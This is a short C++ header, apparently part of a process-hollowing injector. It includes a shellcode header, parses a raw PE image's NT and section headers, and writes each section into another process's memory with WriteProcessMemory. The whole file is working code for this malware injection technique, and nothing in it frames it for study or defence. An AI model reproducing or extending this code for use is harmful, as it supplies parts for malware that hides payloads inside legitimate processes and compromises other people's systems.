#include "shellcode.h"
#include <memoryapi.h>

#ifndef PROCESS_HOLLOWING_PE_H
#define PROCESS_HOLLOWING_PE_H

PIMAGE_NT_HEADERS64 get_nt_header(PIMAGE_DOS_HEADER dos_header) {
    return reinterpret_cast<PIMAGE_NT_HEADERS64>(raw_data + dos_header->e_lfanew);
}

PIMAGE_SECTION_HEADER get_section_header(PIMAGE_DOS_HEADER dos_header) {
    return reinterpret_cast<PIMAGE_SECTION_HEADER>(raw_data + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
}

void write_sections(PIMAGE_SECTION_HEADER _section_header, PVOID new_image_base, PIMAGE_NT_HEADERS64 nt_header, HANDLE process) {
    for (int num = 0; num < nt_header->FileHeader.NumberOfSections; ++num) {
        WriteProcessMemory(process, reinterpret_cast<LPVOID>(reinterpret_cast<ULONG_PTR>(new_image_base) + _section_header->VirtualAddress),
                           raw_data + _section_header->PointerToRawData,
                           _section_header->SizeOfRawData,
                           nullptr);
        ++_section_header;
    }
}

#endif//PROCESS_HOLLOWING_PE_H
